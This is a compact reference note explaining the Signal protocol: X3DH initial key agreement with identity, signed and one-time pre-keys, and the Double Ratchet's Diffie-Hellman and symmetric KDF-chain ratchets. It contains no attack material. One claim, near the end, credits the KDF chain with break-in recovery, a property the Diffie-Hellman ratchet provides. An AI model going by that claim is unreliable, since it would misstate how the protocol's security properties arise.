Signal protocol: provides end-to-end encrypted messaging with forward secrecy and future secrecy (break-in recovery); used by Signal, WhatsApp, Facebook Messenger (secret conversations). Key components: (1) Extended Triple Diffie-Hellman (X3DH): initial key agreement for asynchronous messaging; each user has: IK (Identity Key -- long-term); SPK (Signed Pre-Key -- rotated monthly); OPK (One-Time Pre-Key -- batch of single-use keys); sender fetches recipient's keys from server; computes shared secret from multiple DH exchanges; provides forward secrecy if IK compromised (SPK and OPK protect past messages). (2) Double Ratchet Algorithm: once session established, two ratchets advance state: Diffie-Hellman Ratchet: each message exchange advances DH state (new ephemeral key pair per conversation turn); Symmetric Key Ratchet (KDF chain): derive per-message keys from chain key; KDF chain provides break-in recovery -- after attacker loses access to device, future messages use new ratchet state unknown to attacker; neither party can derive old keys from new state (forward secrecy preserved).
